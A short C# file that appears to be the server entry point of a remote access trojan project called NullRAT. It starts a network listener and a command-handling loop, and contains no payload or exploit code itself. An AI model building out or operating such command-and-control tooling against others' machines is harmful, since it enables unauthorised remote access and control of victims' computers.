using NullRAT.Server.Core;
using NullRAT.Server.UI;
using System;
using System.Threading.Tasks;

namespace NullRAT.Server
{
    public static class ServerCore
    {
        public static async void Start()
        {
            Listener.StartListening();
            await CommandHandler.StartCommandLoop();
        }
    }
}